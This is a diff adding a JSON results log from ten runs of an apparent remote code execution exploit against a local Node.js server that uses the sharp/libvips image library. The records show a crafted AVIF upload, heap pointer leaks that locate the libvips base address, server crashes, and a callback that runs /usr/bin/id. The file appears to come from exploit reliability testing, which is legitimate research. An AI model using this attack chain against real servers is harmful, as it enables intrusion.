@@ -1,0 +1,465 @@
+{
+  "profile_manifest": "profiles/native_stack_profiles.json",
+  "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+  "stock_environment": true,
+  "lifetimes": 10,
+  "successes": 10,
+  "success_rate": 1.0,
+  "distinct_libvips_bases": 10,
+  "results": [
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7fd3a1c00000",
+      "leaks": [
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 1,
+          "strict_candidates": [],
+          "attempt": 1
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 0,
+          "strict_candidates": [],
+          "attempt": 2
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 0,
+          "strict_candidates": [],
+          "attempt": 3
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 2211,
+          "strict_candidates": [],
+          "attempt": 4
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 2094,
+          "strict_candidates": [
+            "0x7fd3a1c00000"
+          ],
+          "attempt": 5
+        }
+      ],
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-0bc6ececf71543ec8585900e963e4c6f.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 1,
+      "exploit_exit": 0,
+      "server_exit": -11
+    },
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7faa2cc00000",
+      "leaks": [
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 1,
+          "strict_candidates": [],
+          "attempt": 1
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 0,
+          "strict_candidates": [],
+          "attempt": 2
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 2224,
+          "strict_candidates": [
+            "0x7faa2cc00000"
+          ],
+          "attempt": 3
+        }
+      ],
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-6bac0fd4e7384bc893435bd99b47fa81.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 2,
+      "exploit_exit": 0,
+      "server_exit": -11
+    },
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7fb81ac00000",
+      "leaks": [
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 1,
+          "strict_candidates": [],
+          "attempt": 1
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 2244,
+          "strict_candidates": [
+            "0x7fb81ac00000"
+          ],
+          "attempt": 2
+        }
+      ],
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-ddd84aea895542c4a54db9bc273ad513.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 3,
+      "exploit_exit": 0,
+      "server_exit": -11
+    },
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7f0991c00000",
+      "leaks": [
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 1,
+          "strict_candidates": [],
+          "attempt": 1
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 0,
+          "strict_candidates": [],
+          "attempt": 2
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 2083,
+          "strict_candidates": [],
+          "attempt": 3
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 1579,
+          "strict_candidates": [
+            "0x7f0991c00000"
+          ],
+          "attempt": 4
+        }
+      ],
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-643f05db06244c799d2f60a1c4b0536f.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 4,
+      "exploit_exit": 0,
+      "server_exit": -11
+    },
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7fbf36c00000",
+      "leaks": [
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 1,
+          "strict_candidates": [],
+          "attempt": 1
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 0,
+          "strict_candidates": [],
+          "attempt": 2
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 2068,
+          "strict_candidates": [
+            "0x7fbf36c00000"
+          ],
+          "attempt": 3
+        }
+      ],
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-e0677ba7f8b44b86ab5c07925a16dc15.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 5,
+      "exploit_exit": 0,
+      "server_exit": -11
+    },
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7f1138400000",
+      "leaks": [
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 1,
+          "strict_candidates": [],
+          "attempt": 1
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 2079,
+          "strict_candidates": [
+            "0x7f1138400000"
+          ],
+          "attempt": 2
+        }
+      ],
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-aacd533fb0ca438cbeb1dd74f4092502.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 6,
+      "exploit_exit": 0,
+      "server_exit": -11
+    },
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7f60d1c00000",
+      "leaks": [
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 1,
+          "strict_candidates": [],
+          "attempt": 1
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 0,
+          "strict_candidates": [],
+          "attempt": 2
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 1898,
+          "strict_candidates": [],
+          "attempt": 3
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 2084,
+          "strict_candidates": [
+            "0x7f60d1c00000"
+          ],
+          "attempt": 4
+        }
+      ],
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-b24d399b99094942af33b006c47e839d.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 7,
+      "exploit_exit": 0,
+      "server_exit": -11
+    },
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7f7dfe400000",
+      "leaks": [
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 1,
+          "strict_candidates": [],
+          "attempt": 1
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 2134,
+          "strict_candidates": [
+            "0x7f7dfe400000"
+          ],
+          "attempt": 2
+        }
+      ],
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-7d6a9408f5cc469697144fa02b8e876d.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 8,
+      "exploit_exit": 0,
+      "server_exit": -11
+    },
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7f1cd2400000",
+      "leaks": [
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 1,
+          "strict_candidates": [],
+          "attempt": 1
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 2189,
+          "strict_candidates": [
+            "0x7f1cd2400000"
+          ],
+          "attempt": 2
+        }
+      ],
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-6072bbe30c5d48afb48ee5c924ca0b5a.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 9,
+      "exploit_exit": 0,
+      "server_exit": -11
+    },
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7f6d32c00000",
+      "leaks": [
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 1,
+          "strict_candidates": [],
+          "attempt": 1
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 0,
+          "strict_candidates": [],
+          "attempt": 2
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 0,
+          "strict_candidates": [],
+          "attempt": 3
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 1915,
+          "strict_candidates": [],
+          "attempt": 4
+        },
+        {
+          "width": 128,
+          "height": 8192,
+          "pointer_qwords": 2117,
+          "strict_candidates": [
+            "0x7f6d32c00000"
+          ],
+          "attempt": 5
+        }
+      ],
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-b248e68d40cf427a9b949c1295ca3a31.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 10,
+      "exploit_exit": 0,
+      "server_exit": -11
+    }
+  ]
+}
